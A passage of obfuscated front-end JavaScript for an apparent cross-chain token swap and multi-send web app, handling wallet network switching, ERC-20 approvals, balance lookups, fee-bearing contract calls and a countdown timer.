$(_0x35d504(0x22d))[_0x35d504(0x2d7)](); return; } else _0x37d750 = _0x4e0c57[_0x35d504(0x223)], _0x1ec408 = _0x4e0c57[_0x35d504(0x367)], console[_0x35d504(0x3bb)](_0x35d504(0x350), CSVEtherTotal), console['log'](_0x35d504(0x339), SendFee); } console[_0x35d504(0x3bb)](_0x35d504(0x3aa), _0x37d750), console[_0x35d504(0x3bb)]('_AmountArray:', _0x1ec408), console[_0x35d504(0x3bb)](_0x35d504(0x26d), contractAdress), _Contract = await new web3[(_0x35d504(0x245))]['Contract'](SmartContractABI, contractAdress, { 'from': web3[_0x35d504(0x1e4)]['selectedAddress'] }); var _0x15f11e = ''; document[_0x35d504(0x333)](_0x35d504(0x36d))[_0x35d504(0x3ba)] ? _0x15f11e = document[_0x35d504(0x333)](_0x35d504(0x35e))[_0x35d504(0x3c2)] : _0x15f11e = '0x0000000000000000000000000000000000000000'; var _0x343797 = 0x1d1a94a2001; console['log'](_0x35d504(0x364), FeeReciever); var _0x4574f1 = await web3[_0x35d504(0x245)][_0x35d504(0x36e)](); console['log'](_0x35d504(0x32a) + _0x4574f1); var _0x396279, _0x32ee17 = web3['utils'][_0x35d504(0x2f6)](BeeFee[_0x35d504(0x21e)]()); console['log'](_0x35d504(0x38f), BeeFee), SendFee = SendFee[_0x35d504(0x21e)](), console[_0x35d504(0x3bb)]('ReferrerFee\x20wei:', _0x32ee17), console[_0x35d504(0x3bb)](_0x35d504(0x2aa), _0x15f11e), console[_0x35d504(0x3bb)](_0x35d504(0x26e), SendFee), await _Contract[_0x35d504(0x322)][_0x35d504(0x321)](_0x37d750, _0x1ec408, _0x15f11e, FeeReciever, _0x32ee17)['estimateGas']({ 'from': web3[_0x35d504(0x1e4)][_0x35d504(0x2bc)], 'value': SendFee })[_0x35d504(0x2dd)](function (_0xf1e299) { _0x396279 = _0xf1e299; })[_0x35d504(0x29c)](function (_0x4ad4a5) { var _0x550958 = _0x35d504; console[_0x550958(0x3bb)](_0x550958(0x2fd), _0x4ad4a5), $(_0x550958(0x22d))[_0x550958(0x2d7)](); }), console[_0x35d504(0x3bb)](_0x35d504(0x285) + _0x396279), document[_0x35d504(0x333)](_0x35d504(0x259))[_0x35d504(0x3ba)] ? (console['log'](_0x35d504(0x295)), await _Contract[_0x35d504(0x322)][_0x35d504(0x321)](_0x37d750, _0x1ec408, _0x15f11e, FeeReciever, _0x32ee17)['send']({ 'from': web3[_0x35d504(0x1e4)][_0x35d504(0x2bc)], 'gas': _0x396279, 'gasPrice': _0x4574f1, 'value': SendFee }, function (_0x1985ce, _0x1160b6) { var _0x10feed = _0x35d504; !_0x1985ce ? console[_0x10feed(0x3bb)]('multiSender\x20finish', _0x1160b6) : (console['log'](_0x10feed(0x297)), _0x1985ce['message'][_0x10feed(0x3b4)]('User\x20denied\x20transaction\x20signature') && (console[_0x10feed(0x3bb)]('User\x20denied\x20transaction\x20signature'), $(_0x10feed(0x22d))[_0x10feed(0x2d7)]())); })[_0x35d504(0x37b)](_0x35d504(0x28d), function (_0x3b4b93) { var _0x427f8f = _0x35d504; console[_0x427f8f(0x3bb)](_0x427f8f(0x382), _0x3b4b93); var _0x54dc9c = BlockchainScan + _0x3b4b93; $('#transactionHashLabel')[_0x427f8f(0x383)]('Transaction\x20Hash:\x20' + _0x427f8f(0x33d) + _0x54dc9c + '\x20target=\x22_blank\x22>' + _0x3b4b93 + '</a>'); })[_0x35d504(0x37b)](_0x35d504(0x2f8), function (_0x260f18) { var _0x53bdce = _0x35d504; console[_0x53bdce(0x3bb)](_0x53bdce(0x2a9), _0x260f18), document[_0x53bdce(0x333)]('transactionHashLabel')['style'][_0x53bdce(0x372)] = _0x53bdce(0x2a8), $(_0x53bdce(0x22d))[_0x53bdce(0x2d7)](); })) : (console['log'](_0x35d504(0x272)), await _Contract[_0x35d504(0x322)][_0x35d504(0x321)](_0x37d750, _0x1ec408, _0x15f11e, FeeReciever, _0x32ee17)[_0x35d504(0x3b7)]({ 'from': web3[_0x35d504(0x1e4)]['selectedAddress'], 'value': SendFee }, function (_0xa29664, _0x7d4bb8) { var _0x37949d = _0x35d504; !_0xa29664 ? console[_0x37949d(0x3bb)](_0x37949d(0x304), _0x7d4bb8) : (console[_0x37949d(0x3bb)](_0x37949d(0x297)), _0xa29664[_0x37949d(0x1e3)][_0x37949d(0x3b4)](_0x37949d(0x2b1)) && (console[_0x37949d(0x3bb)](_0x37949d(0x2b1)), $(_0x37949d(0x22d))[_0x37949d(0x2d7)]())); })[_0x35d504(0x37b)](_0x35d504(0x28d), function (_0x44444b) { var _0x339779 = _0x35d504; console[_0x339779(0x3bb)]('hash:', _0x44444b); var _0x30fbbf = BlockchainScan + _0x44444b; $(_0x339779(0x2a5))[_0x339779(0x383)](_0x339779(0x31d) + _0x339779(0x33d) + _0x30fbbf + _0x339779(0x2c5) + _0x44444b + _0x339779(0x373)); })['once'](_0x35d504(0x2f8), function (_0x323709) { var _0x239b2d = _0x35d504; console[_0x239b2d(0x3bb)](_0x239b2d(0x2a9), _0x323709), document[_0x239b2d(0x333)](_0x239b2d(0x3b0))[_0x239b2d(0x2d9)][_0x239b2d(0x372)] = _0x239b2d(0x2a8), $(_0x239b2d(0x22d))[_0x239b2d(0x2d7)](); })); } async function GetEndTime() { var _0x241f32 = _0x47d6b7; await myContract[_0x241f32(0x322)]['EndTime']()['call']({ 'from': web3[_0x241f32(0x1e4)][_0x241f32(0x2bc)] }, function (_0x1d81cb, _0xaf3ecd) { var _0x32b575 = _0x241f32; if (!_0x1d81cb) { console[_0x32b575(0x3bb)](_0x32b575(0x3ae), _0xaf3ecd); var _0x4538e2 = _0xaf3ecd + _0x32b575(0x242); TimeCount(_0x4538e2); } else console['log']('EndTime\x20can\x20not\x20connect\x20to\x20the\x20smart\x20contract', _0x1d81cb); }); } async function GetRewardPool() { var _0x20ccb9 = _0x47d6b7; await myContract['methods'][_0x20ccb9(0x296)]()[_0x20ccb9(0x3c5)]({ 'from': web3[_0x20ccb9(0x1e4)][_0x20ccb9(0x2bc)] }, function (_0x2256cc, _0x286d79) { var _0x5818ea = _0x20ccb9; !_0x2256cc ? (console[_0x5818ea(0x3bb)]('RewardPool:', _0x286d79), document['getElementById']('RewardPool')[_0x5818ea(0x332)] = _0x5818ea(0x29d) + web3['utils'][_0x5818ea(0x224)](_0x286d79, _0x5818ea(0x305))) : console[_0x5818ea(0x3bb)]('RewardPool\x20can\x20not\x20connect\x20to\x20the\x20smart\x20contract', _0x2256cc); }); } function UserChooseFromItem() { var _0x268b4c = _0x47d6b7; console[_0x268b4c(0x3bb)](_0x268b4c(0x3a7)), $(_0x268b4c(0x35b))[_0x268b4c(0x2d7)](); } function UserChooseToItem() { var _0x5ec690 = _0x47d6b7; console[_0x5ec690(0x3bb)](_0x5ec690(0x1ee)), $(_0x5ec690(0x31a))[_0x5ec690(0x2d7)](); } function ShowISendFilter() { var _0x34e5a8 = _0x47d6b7; $('#SelectISend')[_0x34e5a8(0x29e)](); } function ShowIWantFilter() { var _0x36b698 = _0x47d6b7; $(_0x36b698(0x31a))[_0x36b698(0x29e)](); } function filterFunction() { var _0x286b5a = _0x47d6b7, _0x220fa5, _0x4db699, _0x225308, _0x13ed38, _0x591341, _0x1f5732; _0x220fa5 = document[_0x286b5a(0x333)](_0x286b5a(0x20a)), _0x4db699 = _0x220fa5[_0x286b5a(0x3c2)]['toUpperCase'](), div = document['getElementById'](_0x286b5a(0x2ff)), _0x591341 = div[_0x286b5a(0x26a)]('a'); for (_0x1f5732 = 0x0; _0x1f5732 < _0x591341[_0x286b5a(0x253)]; _0x1f5732++) { txtValue = _0x591341[_0x1f5732][_0x286b5a(0x338)] || _0x591341[_0x1f5732][_0x286b5a(0x3d3)], txtValue['toUpperCase']()[_0x286b5a(0x2c7)](_0x4db699) > -0x1 ? _0x591341[_0x1f5732][_0x286b5a(0x2d9)]['display'] = '' : _0x591341[_0x1f5732][_0x286b5a(0x2d9)][_0x286b5a(0x200)] = _0x286b5a(0x3d0); } } function ToFilterFunction() { var _0x50894d = _0x47d6b7, _0x2b21ff, _0x39bd4d, _0x3114ea, _0x414862, _0x5e6a8f, _0x2df77b; _0x2b21ff = document['getElementById'](_0x50894d(0x3d2)), _0x39bd4d = _0x2b21ff[_0x50894d(0x3c2)][_0x50894d(0x2c3)](), div = document[_0x50894d(0x333)](_0x50894d(0x20f)), _0x5e6a8f = div[_0x50894d(0x26a)]('a'); for (_0x2df77b = 0x0; _0x2df77b < _0x5e6a8f[_0x50894d(0x253)]; _0x2df77b++) { txtValue = _0x5e6a8f[_0x2df77b][_0x50894d(0x338)] || _0x5e6a8f[_0x2df77b][_0x50894d(0x3d3)], txtValue[_0x50894d(0x2c3)]()[_0x50894d(0x2c7)](_0x39bd4d) > -0x1 ? _0x5e6a8f[_0x2df77b]['style'][_0x50894d(0x200)] = '' : _0x5e6a8f[_0x2df77b][_0x50894d(0x2d9)][_0x50894d(0x200)] = _0x50894d(0x3d0); } } async function AddSelect() { var _0x17ff0a = _0x47d6b7, _0x14cdb1 = document[_0x17ff0a(0x333)](_0x17ff0a(0x2ff)), _0x207d68; _0x14cdb1 !== null && $[_0x17ff0a(0x3cd)](Coins, function (_0x7f0a4) { var _0xf90354 = _0x17ff0a; console[_0xf90354(0x3bb)](_0xf90354(0x26f), Coins[_0x7f0a4][0x0]); var _0x102836 = document['createElement'](_0xf90354(0x3b5)); _0x102836[_0xf90354(0x332)] = Coins[_0x7f0a4][_0xf90354(0x1fa)], _0x102836[_0xf90354(0x3c2)] = Coins[_0x7f0a4][_0xf90354(0x1f6)], _0x14cdb1[_0xf90354(0x201)](_0x102836); }); var _0x31e3f2 = document[_0x17ff0a(0x333)]('SelectIWant'); _0x31e3f2 !== null && $[_0x17ff0a(0x3cd)](Coins, function (_0x357fec) { var _0x36eece = _0x17ff0a; console[_0x36eece(0x3bb)](_0x36eece(0x26f), Coins[_0x357fec][0x0]); var _0x50343a = document[_0x36eece(0x20c)]('option'); _0x50343a[_0x36eece(0x332)] = Coins[_0x357fec][_0x36eece(0x1fa)], _0x50343a[_0x36eece(0x3c2)] = Coins[_0x357fec][_0x36eece(0x1f6)], _0x31e3f2[_0x36eece(0x201)](_0x50343a); }), document[_0x17ff0a(0x333)](_0x17ff0a(0x20f))[_0x17ff0a(0x3c2)] = Coins[0x3][_0x17ff0a(0x1f6)]; } function addZero(_0x15e1c3) { var _0x1d98f1 = _0x47d6b7, _0x2b60e4 = _0x15e1c3 + _0x1d98f1(0x21c); return _0x2b60e4; } function component(_0x1c4d4c, _0x3c3c75) { var _0x5dc13c = _0x47d6b7; return Math[_0x5dc13c(0x1eb)](_0x1c4d4c / _0x3c3c75); } function TimeCount(_0x3b5022) { var _0x52ec71 = setInterval(function () { var _0x321757 = _0x2aa2, _0x382c14 = new Date()[_0x321757(0x24c)](), _0x225e5a = _0x3b5022 - _0x382c14, _0x4334ab = Math[_0x321757(0x1eb)](_0x225e5a / (0x3e8 * 0x3c * 0x3c * 0x18)), _0x318503 = Math[_0x321757(0x1eb)](_0x225e5a % (0x3e8 * 0x3c * 0x3c * 0x18) / (0x3e8 * 0x3c * 0x3c)), _0x29baa4 = Math[_0x321757(0x1eb)](_0x225e5a % (0x3e8 * 0x3c * 0x3c) / (0x3e8 * 0x3c)), _0x2ec815 = Math[_0x321757(0x1eb)](_0x225e5a % (0x3e8 * 0x3c) / 0x3e8); $(_0x321757(0x237))[_0x321757(0x383)](_0x4334ab + '<span>Days</span>'), $(_0x321757(0x232))['html'](_0x318503 + _0x321757(0x2bd)), $(_0x321757(0x209))[_0x321757(0x383)](_0x29baa4 + _0x321757(0x23b)), $(_0x321757(0x3ab))['html'](_0x2ec815 + _0x321757(0x323)), _0x225e5a < 0x0 && (clearInterval(_0x52ec71), $(_0x321757(0x237))[_0x321757(0x383)]('0' + _0x321757(0x225)), $(_0x321757(0x232))[_0x321757(0x383)]('0' + _0x321757(0x2bd)), $('#minutes')[_0x321757(0x383)]('0' + '<span>Minutes</span>'), $(_0x321757(0x3ab))[_0x321757(0x383)]('0' + _0x321757(0x323)), $(_0x321757(0x210))[_0x321757(0x29e)]()); }, 0x3e8); } function ChooseBlockchain(_0x3c7a5d) { console['log']('nameID:', _0x3c7a5d), detectEthereumNetwork(_0x3c7a5d); } async function ChooseFromToken(_0x2f3ccd, _0x37bd01) { var _0x40ae83 = _0x47d6b7; detectEthereumNetwork(_0x2f3ccd), $(_0x40ae83(0x234))[_0x40ae83(0x383)](''), USDIn = _0x37bd01; let _0x33f83e = _0x40ae83(0x2fc) + _0x2f3ccd + _0x40ae83(0x358), _0x3fd0ca = _0x40ae83(0x318); checkIfImageExists(_0x33f83e, _0x3a1130 => { if (_0x3a1130) _0x3fd0ca = _0x33f83e; else { } }), console[_0x40ae83(0x3bb)](_0x40ae83(0x36a), USDIn), console[_0x40ae83(0x3bb)]('ChooseFromToken:', Coins[_0x2f3ccd][_0x40ae83(0x1e0)]), document[_0x40ae83(0x333)](_0x40ae83(0x2ab))[_0x40ae83(0x2a0)] = _0x3fd0ca, document[_0x40ae83(0x333)](_0x40ae83(0x20b))['innerHTML'] = Coins[_0x2f3ccd][_0x40ae83(0x1fa)] + '⌄', console[_0x40ae83(0x3bb)](_0x40ae83(0x2f7), Coins[_0x2f3ccd][_0x40ae83(0x1fa)]), await UpdateInfo(); } async function ChooseToToken(_0x3ea2c3, _0x29d635) { var _0x219d80 = _0x47d6b7; $(_0x219d80(0x234))['html'](''), document['getElementById'](_0x219d80(0x2a3))[_0x219d80(0x3c2)] = parseInt(document[_0x219d80(0x333)](_0x219d80(0x1f2))[_0x219d80(0x3c2)]), USDOut = _0x29d635, RecieverNetworkID = _0x3ea2c3; let _0x122a48 = _0x219d80(0x2fc) + _0x3ea2c3 + _0x219d80(0x358), _0x20d9a3 = 'img/icon/default.png'; checkIfImageExists(_0x122a48, _0x12b839 => { if (_0x12b839) _0x20d9a3 = _0x122a48; else { } }), console[_0x219d80(0x3bb)](_0x219d80(0x27d), USDOut), console[_0x219d80(0x3bb)](_0x219d80(0x32f), Coins[_0x3ea2c3][_0x219d80(0x1e0)]), document[_0x219d80(0x333)](_0x219d80(0x3bf))['src'] = _0x20d9a3, document[_0x219d80(0x333)]('ToButton')['innerHTML'] = Coins[_0x3ea2c3][_0x219d80(0x1fa)] + '⌄', console[_0x219d80(0x3bb)](_0x219d80(0x39a), Coins[_0x3ea2c3][_0x219d80(0x1fa)]), $(_0x219d80(0x2c4))[_0x219d80(0x383)](_0x219d80(0x378) + document[_0x219d80(0x333)]('ISendInput')['value'] + '\x20' + Coins[RecieverNetworkID][_0x219d80(0x241)] + _0x219d80(0x1f0) + Coins[SenderNetworkID][_0x219d80(0x39e)] + Coins[RecieverNetworkID][_0x219d80(0x291)]), GetTokenBlance(_0x3ea2c3), await UpdateInfo(); } async function SwitchToken() { var _0x4a9f24 = _0x47d6b7; let _0x29921e = document[_0x4a9f24(0x333)](_0x4a9f24(0x3bf))[_0x4a9f24(0x2a0)], _0x57dbff = document[_0x4a9f24(0x333)](_0x4a9f24(0x2a7))[_0x4a9f24(0x332)], _0x121d6e = USDIn; USDIn = USDOut, USDOut = _0x121d6e, console[_0x4a9f24(0x3bb)](_0x4a9f24(0x2b8), _0x29921e), console['log'](_0x4a9f24(0x262), _0x57dbff), document[_0x4a9f24(0x333)]('ToImage')[_0x4a9f24(0x2a0)] = document[_0x4a9f24(0x333)](_0x4a9f24(0x2ab))[_0x4a9f24(0x2a0)], document[_0x4a9f24(0x333)](_0x4a9f24(0x2a7))[_0x4a9f24(0x332)] = document[_0x4a9f24(0x333)](_0x4a9f24(0x20b))[_0x4a9f24(0x332)], document[_0x4a9f24(0x333)]('FromImage')['src'] = _0x29921e, document[_0x4a9f24(0x333)](_0x4a9f24(0x20b))[_0x4a9f24(0x332)] = _0x57dbff, console[_0x4a9f24(0x3bb)](_0x4a9f24(0x341), USDIn), console[_0x4a9f24(0x3bb)]('Switch\x20\x20USDOut:', USDOut); var _0x899b54 = SenderNetworkID; SenderNetworkID = RecieverNetworkID, RecieverNetworkID = _0x899b54, await detectEthereumNetwork(SenderNetworkID); } async function detectEthereumNetwork(_0x61bd86) { var _0x17201d = _0x47d6b7, _0x33888c = { 'chainName': _0x17201d(0x313), 'chainxName': _0x17201d(0x3c8), 'symbol': _0x17201d(0x3c8), 'rpcUrls': _0x17201d(0x3b1), 'blockExplorerUrls': _0x17201d(0x2ad) }, _0x59ad3f = { 'chainName': _0x17201d(0x289), 'chainxName': 'Matic', 'symbol': _0x17201d(0x270), 'rpcUrls': _0x17201d(0x3b2), 'blockExplorerUrls': _0x17201d(0x2b7) }, _0x240cfd = { 'chainName': 'Huobi\x20ECO\x20Chain\x20Mainnet', 'chainxName': 'HT', 'symbol': 'HT', 'rpcUrls': 'https://http-mainnet.hecochain.com', 'blockExplorerUrls': _0x17201d(0x37a) }, _0x4031c4 = { 'chainName': 'Fantom\x20Opera', 'chainxName': 'FTM', 'symbol': _0x17201d(0x3a8), 'rpcUrls': 'https://rpcapi.fantom.network', 'blockExplorerUrls': 'https://ftmscan.com' }, _0x1e4eff = _0x61bd86, _0x15a920 = await web3[_0x17201d(0x245)][_0x17201d(0x353)][_0x17201d(0x243)](); console[_0x17201d(0x3bb)](_0x17201d(0x1ec), _0x15a920); var _0x549a76; if (_0x1e4eff == 0x38) _0x549a76 = _0x33888c; else { if (_0x1e4eff == 0x80) _0x549a76 = _0x240cfd; else { if (_0x1e4eff == 0x89) _0x549a76 = _0x59ad3f; else _0x1e4eff == 0xfa && (_0x549a76 = _0x4031c4); } } if (_0x15a920 == _0x1e4eff && _0x15a920 != 0x13881) return console[_0x17201d(0x3bb)](_0x17201d(0x250)), !![]; try { $('#Tips')[_0x17201d(0x383)](_0x17201d(0x3be)), await window['ethereum'][_0x17201d(0x3ca)]({ 'method': 'wallet_switchEthereumChain', 'params': [{ 'chainId': '0x' + decimalToHexString(parseInt(_0x61bd86)) }] }), window[_0x17201d(0x309)][_0x17201d(0x27f)](); } catch (_0x153b4c) { console[_0x17201d(0x3bb)](_0x17201d(0x29a), _0x153b4c['code']); if (_0x153b4c['code'] == 0x1326) try { console[_0x17201d(0x3bb)]('not\x20found\x20network,now\x20add\x20it\x20.', _0x153b4c[_0x17201d(0x317)]), await window['ethereum'][_0x17201d(0x3ca)]({ 'method': 'wallet_addEthereumChain', 'params': [{ 'chainId': '0x' + decimalToHexString(parseInt(_0x61bd86)), 'chainName': _0x549a76[_0x17201d(0x302)], 'nativeCurrency': { 'name': _0x549a76[_0x17201d(0x3ce)], 'symbol': _0x549a76[_0x17201d(0x1fa)], 'decimals': 0x12 }, 'rpcUrls': [_0x549a76['rpcUrls']], 'blockExplorerUrls': [_0x549a76['blockExplorerUrls']] }] }); return ![]; window[_0x17201d(0x309)][_0x17201d(0x27f)](); } catch (_0x29d204) { if (_0x29d204['code'] == 0xfa1) return console[_0x17201d(0x3bb)](_0x17201d(0x33a), _0x29d204['message']), $(_0x17201d(0x22d))[_0x17201d(0x2d7)](), $(_0x17201d(0x234))['html'](''), ![]; } else { if (_0x153b4c['code'] == 0xfa1) return console['log'](_0x17201d(0x337), _0x153b4c[_0x17201d(0x1e3)]), $(_0x17201d(0x22d))[_0x17201d(0x2d7)](), $(_0x17201d(0x234))[_0x17201d(0x383)](''), ![]; } } $('#Tips')['html'](''); } function decimalToHexString(_0x18e5ef) { var _0xa80e2e = _0x47d6b7; return _0x18e5ef < 0x0 && (_0x18e5ef = 0xffffffff + _0x18e5ef + 0x1), _0x18e5ef['toString'](0x10)[_0xa80e2e(0x2c3)](); } async function CheckValue() { var _0x4c3062 = _0x47d6b7, _0x37439e = parseInt(document['getElementById'](_0x4c3062(0x1f2))[_0x4c3062(0x3c2)]); console['log']('MyTokenBalance:', MyTokenBalance); if (_0x37439e < 0x3) return $(_0x4c3062(0x234))[_0x4c3062(0x29e)](), $(_0x4c3062(0x234))['html'](_0x4c3062(0x273)), ![]; var _0x12fc96 = _0x37439e + 0x1; if (_0x12fc96 > MyTokenBalance) return $(_0x4c3062(0x234))[_0x4c3062(0x29e)](), $(_0x4c3062(0x234))[_0x4c3062(0x383)](_0x4c3062(0x28b) + _0x12fc96 + _0x4c3062(0x354) + parseFloat(MyTokenBalance)[_0x4c3062(0x2df)](0x2)), ![]; if (_0x37439e > MaxTradeUSD) return console[_0x4c3062(0x3bb)]('MaxTradeUSD:', MaxTradeUSD), $('#Tips')[_0x4c3062(0x383)]('Our\x20USD\x20is\x20not\x20enough.'), ![]; return !![]; } async function ISendInputChange() { var _0x379a70 = _0x47d6b7; $(_0x379a70(0x234))['html'](''); var _0x4571bf = await CheckValue(); console[_0x379a70(0x3bb)](_0x379a70(0x3c6), _0x4571bf); if (!_0x4571bf === ![]) return; parseFloat(document[_0x379a70(0x333)](_0x379a70(0x1f2))['value']) > 0x2 && (document[_0x379a70(0x333)](_0x379a70(0x2a3))[_0x379a70(0x3c2)] = parseInt(document['getElementById'](_0x379a70(0x1f2))[_0x379a70(0x3c2)]), document[_0x379a70(0x333)](_0x379a70(0x1f2))[_0x379a70(0x3c2)] = parseInt(document[_0x379a70(0x333)]('ISendInput')['value']), $(_0x379a70(0x1f1))[_0x379a70(0x383)](_0x379a70(0x281) + (parseInt(document[_0x379a70(0x333)](_0x379a70(0x1f2))[_0x379a70(0x3c2)]) + Coins[SenderNetworkID][_0x379a70(0x2d8)]) + '\x20' + Coins[SenderNetworkID][_0x379a70(0x241)])); } async function approveThis() { var _0x166123 = _0x47d6b7; $(_0x166123(0x33e))['hide'](); try { const _0x2805b6 = web3['utils'][_0x166123(0x2be)](USDIn); } catch (_0x369839) { console[_0x166123(0x30d)](_0x166123(0x30f), _0x369839[_0x166123(0x1e3)]), TokenContractAddress = USDIn; return; } $(_0x166123(0x33e))[_0x166123(0x29e)](), TokenContract = await new web3[(_0x166123(0x245))]['Contract'](TokenSmartContractABI, USDIn, { 'from': web3[_0x166123(0x1e4)]['selectedAddress'] }); const _0x26763a = await TokenContract['methods'][_0x166123(0x381)](contractAdress, _0x166123(0x208))[_0x166123(0x3b7)]({ 'from': web3['currentProvider'][_0x166123(0x2bc)] }, function (_0x519c82, _0x20f690) { var _0x1dc725 = _0x166123; !_0x519c82 ? console[_0x1dc725(0x3bb)](_0x1dc725(0x397)) : ($('#loader2')[_0x1dc725(0x2d7)](), console[_0x1dc725(0x3bb)](_0x1dc725(0x28a))); })[_0x166123(0x37b)](_0x166123(0x28d), function (_0x1cc976) { var _0x2afa00 = _0x166123; console[_0x2afa00(0x3bb)](_0x2afa00(0x2d0), _0x1cc976); })[_0x166123(0x37b)](_0x166123(0x2f8), function (_0x286ce3) { var _0x5e3e1e = _0x166123; console['log']('Approval\x20receipt:', _0x286ce3), $(_0x5e3e1e(0x30c))['hide'](), $(_0x5e3e1e(0x33e))[_0x5e3e1e(0x2d7)](); }); } async function getApproveStatus(_0x37d762, _0x25ecd0) { var _0x4b6382 = _0x47d6b7; console['log']('getApproveStatus...'), await TokenContract['methods'][_0x4b6382(0x32b)](_0x37d762, _0x25ecd0)[_0x4b6382(0x3c5)]({ 'from': web3['currentProvider'][_0x4b6382(0x2bc)] }, function (_0xa67f3d, _0x28081f) { var _0x3b878b = _0x4b6382; !_0xa67f3d && (console[_0x3b878b(0x3bb)](_0x3b878b(0x2bb), _0x28081f), _0x28081f > 0x0 ? ($(_0x3b878b(0x30c))[_0x3b878b(0x2d7)](), console[_0x3b878b(0x3bb)]('Already\x20approved!'), NeedApproveToken = ![]) : ($(_0x3b878b(0x30c))[_0x3b878b(0x29e)](), console['log']('have\x20not\x20approved,please\x20approve\x20first!'), NeedApproveToken = !![])); }); } async function LoadMainCoinBalance() { var _0x2917a7 = _0x47d6b7, _0x4f9258 = await web3[_0x2917a7(0x245)][_0x2917a7(0x25d)](web3[_0x2917a7(0x1e4)][_0x2917a7(0x2bc)]), _0x11c447 = Math[_0x2917a7(0x35a)](0xa, parseInt(0x12)); LeftCoinBalance = _0x4f9258 / _0x11c447, $(_0x2917a7(0x2b5))[_0x2917a7(0x383)](_0x2917a7(0x2d5) + LeftCoinBalance), document['getElementById'](_0x2917a7(0x1f2))[_0x2917a7(0x3c2)] = LeftCoinBalance, console['log'](_0x2917a7(0x206), _0x4f9258); } async function ISendChange() { var _0x4f2c5c = _0x47d6b7; console[_0x4f2c5c(0x3bb)](_0x4f2c5c(0x2f5)); } async function balanceOf(_0x4cb76d, _0x3d7abe) { var _0x7f6aa3 = _0x47d6b7; $(_0x7f6aa3(0x386))[_0x7f6aa3(0x383)](_0x7f6aa3(0x24f)), await _0x3d7abe[_0x7f6aa3(0x322)]['balanceOf'](_0x4cb76d)[_0x7f6aa3(0x3c5)]({ 'from': web3[_0x7f6aa3(0x1e4)][_0x7f6aa3(0x2bc)] }, function (_0x4cc90c, _0x5db862) { var _0x15bf61 = _0x7f6aa3; !_0x4cc90c ? (console['log'](_0x15bf61(0x1e9), _0x5db862), _0x3d7abe[_0x15bf61(0x322)][_0x15bf61(0x3b3)]()[_0x15bf61(0x3c5)](function (_0x6f2f35, _0x55a0e4) { var _0x2136cf = _0x15bf61, _0x5d0664 = parseInt(_0x5db862); console[_0x2136cf(0x3bb)](_0x2136cf(0x30b), _0x5d0664); var _0x54d40d = Math['pow'](0xa, parseInt(_0x55a0e4)), _0x2744a0 = _0x5d0664 / _0x54d40d; console[_0x2136cf(0x3bb)](_0x2136cf(0x25c), _0x2744a0[_0x2136cf(0x247)]('fullwide', { 'useGrouping': ![] })), $(_0x2136cf(0x386))[_0x2136cf(0x383)](_0x2136cf(0x2d5) + _0x2744a0[_0x2136cf(0x247)]('fullwide', { 'useGrouping': ![] })), CurrentTokenDecimals = BigInt(_0x55a0e4), console[_0x2136cf(0x3bb)](_0x2136cf(0x1fb), _0x55a0e4), console[_0x2136cf(0x3bb)]('decimal\x20*\x2010:', _0x54d40d), console['log'](_0x2136cf(0x30b), BigInt(_0x5d0664)); })) : ($(_0x15bf61(0x386))[_0x15bf61(0x383)](_0x15bf61(0x384)), document[_0x15bf61(0x333)](_0x15bf61(0x35e))[_0x15bf61(0x229)] = ![], console['log'](_0x15bf61(0x2fa))); }); } function IWantChange() { var _0x1798f9 = _0x47d6b7; console[_0x1798f9(0x3bb)](_0x1798f9(0x31f)), console[_0x1798f9(0x3bb)](_0x1798f9(0x38e), NetID), checkStock(), $('#SendUSDDescription')[_0x1798f9(0x383)](_0x1798f9(0x281) + (parseInt(document[_0x1798f9(0x333)](_0x1798f9(0x1f2))[_0x1798f9(0x3c2)]) + 0x1) + '\x20USDT'), $(_0x1798f9(0x2c4))['html'](_0x1798f9(0x378) + document[_0x1798f9(0x333)](_0x1798f9(0x1f2))[_0x1798f9(0x3c2)] + '\x20' + Coins[RecieverNetworkID]['USDSymbol'] + '\x20and\x20' + Coins[SenderNetworkID][_0x1798f9(0x39e)] + Coins[RecieverNetworkID][_0x1798f9(0x291)]); } async function checkStock() { var _0x29cd83 = _0x47d6b7; if (document[_0x29cd83(0x333)](_0x29cd83(0x20f))['value'] == '56' && parseInt(document['getElementById']('IWantInput')[_0x29cd83(0x3c2)]) > binanceLimit) return $('#Tips')[_0x29cd83(0x383)](_0x29cd83(0x2ea) + binanceLimit), console['log'](_0x29cd83(0x3cb)), ![]; else return document[_0x29cd83(0x333)]('SelectIWant')[_0x29cd83(0x3c2)] == _0x29cd83(0x256) && parseInt(document[_0x29cd83(0x333)]('IWantInput')[_0x29cd83(0x3c2)]) > polygonLimit ? ($('#Tips')[_0x29cd83(0x383)](_0x29cd83(0x3c9) + polygonLimit), console['log']('Stock\x20Not\x20enough'), ![]) : ($('#Tips')[_0x29cd83(0x383)](''), !![]); } function _0x2aa2(_0x2c6070, _0x5d8906) { var _0x20344a = _0x2034(); return _0x2aa2 = function (_0x2aa284, _0x60ab2e) { _0x2aa284 = _0x2aa284 - 0x1df; var _0x214258 = _0x20344a[_0x2aa284]; return _0x214258; }, _0x2aa2(_0x2c6070, _0x5d8906); } async function GetTokenBlance(_0x2d5dca) { var _0x7c3c5b = _0x47d6b7; $(_0x7c3c5b(0x220))[_0x7c3c5b(0x383)](_0x7c3c5b(0x24f)), console[_0x7c3c5b(0x3bb)](_0x7c3c5b(0x22c), _0x2d5dca); const _0x5926df = [{ 'constant': !![], 'inputs': [{ 'name': _0x7c3c5b(0x393), 'type': 'address' }], 'name': 'balanceOf', 'outputs': [{ 'name': _0x7c3c5b(0x290), 'type': _0x7c3c5b(0x231) }], 'type': _0x7c3c5b(0x264) }]; var _0x3371b4 = new Web3(new Web3['providers']['HttpProvider'](Coins[_0x2d5dca]['RPCURL'])); const _0x55ee75 = await new _0x3371b4[(_0x7c3c5b(0x245))][(_0x7c3c5b(0x235))](_0x5926df, Coins[_0x2d5dca][_0x7c3c5b(0x1e0)], { 'from': web3['currentProvider'][_0x7c3c5b(0x2bc)] }), _0x3efb79 = await _0x55ee75[_0x7c3c5b(0x322)][_0x7c3c5b(0x3b6)](Coins[_0x2d5dca][_0x7c3c5b(0x2f2)])['call'](); console[_0x7c3c5b(0x3bb)](_0x7c3c5b(0x312), _0x3efb79); var _0x5aa4f9 = Math[_0x7c3c5b(0x35a)](0xa, parseInt(Coins[_0x2d5dca][_0x7c3c5b(0x222)])), _0x2be69f = _0x3efb79 / _0x5aa4f9 - 0x1; MaxTradeUSD = parseInt(_0x2be69f['toFixed'](0x0)), $(_0x7c3c5b(0x220))[_0x7c3c5b(0x383)](_0x7c3c5b(0x2e3) + _0x7c3c5b(0x394) + MaxTradeUSD + _0x7c3c5b(0x2ed)); } async function balanceOfToken(_0x107663, _0x184df1) { var _0x598e1e = _0x47d6b7; 